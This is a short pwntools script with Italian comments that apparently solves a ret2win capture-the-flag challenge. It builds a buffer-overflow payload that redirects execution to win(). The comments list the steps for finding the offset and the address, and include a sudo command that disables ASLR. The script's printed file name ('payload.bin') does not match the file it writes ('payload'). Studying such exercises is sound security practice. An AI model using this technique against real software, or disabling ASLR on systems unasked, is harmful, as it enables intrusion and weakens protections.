from pwn import *

# Indirizzo della funzione win()
#win_addr = 0x5555555551a9
win_addr = 0x4011d6
# Offset calcolato con la sequenza ciclica
offset = 72
ret_gadget = p64(0x40101a)

# Crea il payload: 72 byte di padding + indirizzo della funzione win
payload = b"A" * offset + ret_gadget + p64(win_addr)


# Scrive il payload su un file binario
with open("payload", "wb") as f:
    f.write(payload)

print("Payload scritto su 'payload.bin'")



#procedimento:
#1) calcola offset: 
#Genera una sequenza ciclica con pwntools e copiala per inserirla nel programma: $ pwn cyclic 128
#ncolla questa sequenza nel programma per causare il crash (buffer overflow): Inserisci il tuo input: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa
#Controlla il valore sovrascritto nel registro RIP (return address) con pwndbg: (gdb) x/gx $rsp
#Dovresti vedere qualcosa del genere: 0x7fffffffde58: 0x616161616161616e
# Trova l'offset esatto del buffer overflow usando pwntools: $ pwn cyclic -l 0x616161616161616e
#2) Calcola l'indirizzo della funzione win()
#gdb ./ret2win
#(gdb) break main
#(gdb) run
#(gdb) print win
# L'output sar√† l'indirizzo corretto, ad esempio 0x4005b6.
#metti questi valori e ottieni la flag
#il file va compilato senza protezioni

 ##NOTA: Bisogna disabilitare ASLR 
 #sudo sysctl -w kernel.randomize_va_space=0
